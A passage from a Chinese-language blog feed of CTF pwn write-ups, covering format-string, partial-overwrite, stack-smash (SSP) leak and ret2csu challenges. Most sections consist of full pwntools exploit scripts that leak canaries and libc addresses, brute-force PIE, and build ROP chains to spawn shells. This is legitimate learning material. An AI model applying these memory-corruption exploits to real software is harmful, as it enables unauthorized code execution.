class="line">stack_addr = int(s.strip(),16)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line">stack = stack_addr + 0x10</span><br><span class="line">p.sendline(&quot;%&quot; + str(stack&amp;0xff) + &quot;c%6$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%16c%14$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%18$s&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8711.png" alt></p><p>这道题真实的flag好像是suctf{P_rin_Tfo}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了&lt;/p&gt;
&lt;p&gt;以下附上超级简单题的一些思路，当做给自己的记录吧&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>partial overwrite</title>
    <link href="http://yoursite.com/2019/08/16/overwrite/"/>
    <id>http://yoursite.com/2019/08/16/overwrite/</id>
    <published>2019-08-16T07:00:49.000Z</published>
    <updated>2019-08-20T17:00:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p><a id="more"></a><h1 id="Babypie"><a href="#Babypie" class="headerlink" title="Babypie"></a>Babypie</h1><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%871.png" alt><br>这是一道保护全开的题<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%872.png" alt></p><p>看到主程序，发现有两处写入</p><p>Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址<br>leak canary<br>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。<br>为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%873.png" alt></p><p>发现有个可以直接getshell的函数，直接可以调用<br>我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数</p><p>然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">try:</span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line"></span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">except EOFError:</span><br><span class="line">p.close()</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p>爆破了n遍之后终于。。。<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%874.png" alt></p><p>然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">payload = &apos;&apos;</span><br><span class="line">payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果长这样<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%875.png" alt></p><h1 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h1><p>这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，<strong>libc_start_main+192 和 _dl_init+139<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%876.png" alt><br>我们到底选择覆盖哪个呢？这就很茫然了<br>Wiki上说的是：<br>我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。<br>而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看</strong>libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。<br>一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。<br>而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。<br>举个例子，目前两者之间的偏移为<br>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000<br>那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。<br>然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的）</p><p>所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移）</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%877.png" alt><br>然后我们找一个能用的onegadget<br>我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">common_gadget = 0x40059B</span><br><span class="line">def exp():</span><br><span class="line">    for i in range(0x100000):</span><br><span class="line">        # if args[&apos;REMOTE&apos;]:</span><br><span class="line">        #     p = remote(ip, port)</span><br><span class="line">        # else:</span><br><span class="line">        #     p = process(&apos;./gets&apos;)</span><br><span class="line">        # # gdb.attach(p)</span><br><span class="line">        p = process(&apos;./gets&apos;)</span><br><span class="line">        try:</span><br><span class="line">            payload = 0x18 * &apos;a&apos; + p64(common_gadget)</span><br><span class="line">            for _ in range(2):</span><br><span class="line">                payload += &apos;a&apos; * 0x28 + p64(common_gadget)</span><br><span class="line">            payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos;</span><br><span class="line">            p.sendline(payload)</span><br><span class="line"></span><br><span class="line">            p.sendline(&apos;ls&apos;)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            print data</span><br><span class="line">            p.interactive()</span><br><span class="line">            p.close()</span><br><span class="line">        except Exception:</span><br><span class="line">            p.close()</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;partial-overwrite&quot;&gt;&lt;a href=&quot;#partial-overwrite&quot; class=&quot;headerlink&quot; title=&quot;partial overwrite&quot;&gt;&lt;/a&gt;partial overwrite&lt;/h2&gt;&lt;p&gt;我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。&lt;br&gt;（对于绕过PIE的操作我是没怎么接触过的）&lt;br&gt;大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ssp操作</title>
    <link href="http://yoursite.com/2019/08/16/ssp/"/>
    <id>http://yoursite.com/2019/08/16/ssp/</id>
    <published>2019-08-16T03:39:15.000Z</published>
    <updated>2019-09-02T16:12:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串<br>就是通过栈溢出报错信息，泄漏出指定地址的方法：<br>　　stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><a id="more"></a><p>满足条件为<br>1、开了canary<br>2、Flag在程序内</p><p>看wiki里的花式栈溢出的时候看到的题（其实我很迷为啥把它放到花式栈溢出里，之后再细细研究吧）</p><p>关于stack smash</p><p>这个有点开拓我知识面了，对于canary我一直很迷，看到这里才知道canary操作起来是个啥样子的。<br>Wiki原话：</p><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行?__stack_chk_fail?函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。<br>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;</span><br></pre></td></tr></table></figure><p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在?__fortify_fail?函数中就会输出我们想要的信息</p><h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><p>所以我们要找argv[0]的地址，（因为我们要求的偏移就是argv[0] 距离读取的字符串的偏移）</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%871.png" alt></p><p>程序名指向的地址为e159，但是dd98里存放的是指向程序名的地址，所以我们需要的地址为后者<br>接着在输入的地方下个断点，找上一个rsp作为字符串开始的地址</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%872.png" alt></p><p>然后我们就可以算偏移了</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%873.png" alt></p><p>所以我们的偏移为0x218</p><p>看程序会发现在一个地方会有flag的输出</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%874.png" alt></p><p>但是我们看不到flag是什么<br>最无奈的是我们输入的内容会覆盖整个地址，所以我们没有办法直接读出<br>我们只能去找另一处的flag地址，这就接触到里另一个新的知识点了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找（pwndbg的话就用search吧）</span><br></pre></td></tr></table></figure><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%875.png" alt></p><p>现在就可以写exp了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&apos;./smashes&apos;)</span><br><span class="line">p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</span><br><span class="line"></span><br><span class="line">flag = 0x0400D20</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x218 + p64(flag)</span><br><span class="line">p.recvuntil(&apos;name? &apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;flag: &apos;)</span><br><span class="line">p.sendline(&apos;CTF&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里很坑的就是我找flag是按照程序里给的格式找的，是CTF开头的，但是真正的flag是PCTF（0x600d20那个位置的0x50转字符就是P），所以它的地址得再往前拨一位</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%876.png" alt></p><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>再来做道GUESS<br>这题有三次的输入，我们可以通过三次输入实现我们的leak和读取flag，这题和上面那题的思路大概是一致的，都是读取栈上的字符串，而不需要getshell（上面那题是可以知道flag具体存在哪里了，这题需要libc找）</p><p>本题思路：</p><p>1.泄漏libc的基址<br>2.泄漏environ的地址（也就是栈的地址）<br>3.泄漏flag</p><p>三次泄漏都用到了上一题说的ssp，就是通过栈溢出报错信息，泄漏出指定地址的方法：stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><p>对environ很迷的我看了一下23R3F大佬的wp，又发现了新的玩意儿(以下来自大佬博客<a href="https://www.jianshu.com/p/cc9d09a3f65f)：" target="_blank" rel="noopener">https://www.jianshu.com/p/cc9d09a3f65f)：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments?section）</span><br><span class="line">用来存储系统环境变量的一份复制文件，进程在运行时可能需要。</span><br><span class="line">例如，运行中的进程，可以通过环境变量来访问路径、shell?名称、主机名等信息。</span><br><span class="line">该节是可写的，因此在格式串（format?string）和缓冲区溢出（buffer?overflow）攻击中都可以攻击该节。</span><br><span class="line">*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。</span><br></pre></td></tr></table></figure><p>好，我们按照刚刚那题的解题步骤，先找argv[0]和字符串开始的地方来计算偏移</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%877.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%878.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%879.png" alt></p><p>算出偏移我们就可以按照思路来写exp了<br>前面两个part如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./GUESS&apos;)</span><br><span class="line">elf = ELF(&apos;./GUESS&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line"># open_flag = 0x400A9A</span><br><span class="line"># argv = 0x7fffffffdda8</span><br><span class="line"># rsi_addr = 0x7fffffffdc80</span><br><span class="line"># distance = 0x128</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x128 + p64(puts_got)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;puts_addr:&quot;+hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[&apos;puts&apos;] </span><br><span class="line">environ_addr = libc_base + libc.symbols[&apos;_environ&apos;] </span><br><span class="line">print &quot;libc_base:&quot;+hex(libc_base) </span><br><span class="line">print &quot;environ:&quot;+hex(environ_addr)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x128 + p64(environ_addr) </span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;stack_addr:&quot;+hex(stack_addr)</span><br></pre></td></tr></table></figure><p>然后我们要算出buf与environ的差值，使程序跳转到flag的位置</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8710.png" alt></p><p>构造最后一步的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x128 + p64(stack_addr-0x168)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>最后效果</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8711.png" alt></p><p>其实还是挺迷的，以后碰到题可能还会懵，先记录着吧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串&lt;br&gt;就是通过栈溢出报错信息，泄漏出指定地址的方法：&lt;br&gt;　　stack smashing detected:+argv[0]&lt;br&gt;如果我们覆盖argv[0]，便会输出特定字符串&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>libc_csu</title>
    <link href="http://yoursite.com/2019/07/08/libc-csu/"/>
    <id>http://yoursite.com/2019/07/08/libc-csu/</id>
    <published>2019-07-08T15:15:17.000Z</published>
    <updated>2019-07-08T15:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="libc-csu"><a href="#libc-csu" class="headerlink" title="_libc_csu"></a><em>_libc_csu</em></h2><p>1、Ret2csu</p><p>这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。<br>Emmm真是一个异常简洁的main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png" alt></p><p>我们发现它有个pwnme函数哦，那就点进去看一下</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png" alt></p><p>它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png" alt></p><a id="more"></a><p>然后我们会看到还有一个ret2win函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%874.png" alt></p><p>看到system就知道我们的getshell的关键步骤就在这里了，最后就是要把地址指向ret2win这个函数的，所以下一步就是要去找gadget。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%875.png" alt></p><p>我们知道ret2win的第三个参数是与rdx有关的，但是我们找不到关于rdx的gadget，所以只能另辟他径。<br>ret2csu这类题目貌似就是通过__libc_csu_init函数的操作（很多gadget的函数）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%876.png" alt></p><p>由函数体关系得知<br>rbx=0<br>rbp=1（rbp=rbx+1）<br>r12：存调用函数的地址<br>r13：函数的第一个参数<br>r14：函数的第二个参数<br>r15：函数的第三个参数（a3/rdx）</p><p>然后还有一个很严重的问题，有一个setvbuf函数，据大佬所说是会把rdx的值赋值为0xfffffff，然后无法调用ret2win，所以导致在call处程序出错，无法再执行下去（但是我是在是调不到setvbuf那个函数的地方，下断点也没找到那个赋值语句）然后只能选用一个程序的初始化用的函数地址，</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%877.png" alt></p><p>就这两个函数的地址，用这两个函数写入r12里，躲过setvbuf，然后就可以getshell了。</p><p>rdx是由r15传值得到的，而刚好下面的一系列操作包括r15的，所以这些gadget可用，上面的函数有个跳转指令，为了使他不跳转，我们可以直接对rbx和rbp赋值，rbx为0，rbp为1。我们先pop这些寄存器，并且赋值，再进入mov，最后在call的地方调用ret2win，所以r12存的应该是ret2win的地址。<br>理清得差不多了，就开始写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bss = 0x0601060</span></span><br><span class="line">start = 0x0400880<span class="comment">#mov rdx, r15;mov  rsi, r14;mov  edi, r13d;call  qword ptr [r12+rbx*8]</span></span><br><span class="line">end = 0x0400896<span class="comment">#add  rsp, 8;pop  rbx;pop  rbp;pop  r12/r13/r14/r15</span></span><br><span class="line">init = 0x0600E10</span><br><span class="line">win = 0x04007B1</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(end)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(0)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(1)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(init)<span class="comment">#r12</span></span><br><span class="line">payload += p64(0)<span class="comment">#r13</span></span><br><span class="line">payload += p64(0)<span class="comment">#r14</span></span><br><span class="line">payload += p64(0xdeadcafebabebeef)<span class="comment">#r15(rdx)</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload += <span class="string">"a"</span>*56</span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行之后就拿到flag了</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%878.png" alt></p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>Ida里打开main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%879.png" alt><br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8710.png" alt></p><p>发现这个程序调用了write和read两个函数。<br>没有system没有“/bin/sh”<br>看到了熟悉的gadget</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8711.png" alt></p><p>再看看在write和read里面，参数分别是存入哪些寄存器</p><p>Write<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8712.png" alt></p><p>Read<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8713.png" alt></p><p>易知第三个参数存入edx（rdx），第二个是esi（rsi），第三个是edi（rdi）<br>在上面的万用gadget里我们知道rdx的值来自于r13，rsi来自于r14，edi来自于r15d</p><p>我们要做的是<br>（1）、先调用write函数把read/write函数的真实地址泄露出来（运行程序的时候这两个函数被调用了）找到system或者execve的真实地址<br>（2）、用read函数，把system（“/bin/sh”）写进bss段里(system在bss里，即bss_addr，”/bin/sh”在bss的下一个地址,即bss_addr+8<br>（3）、调用system函数达成getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level5"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#bss_base = elf.bss()</span></span><br><span class="line">bss_addr = 0x0601040</span><br><span class="line"></span><br><span class="line">start_addr = 0x0400600  <span class="comment">#add rsp, 8 pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">end_addr = 0x040061A  <span class="comment">#mov rdx,13 rsi,r14 eid,r15 call</span></span><br><span class="line">_start = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu(rbx,rbp,r12,r13,r14,r15,_start):</span><br><span class="line">payload = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload += p64(end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(start_addr)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(_start)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,write_got,8,write_got,1,_start)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(8))</span><br><span class="line">libc = LibcSearcher(<span 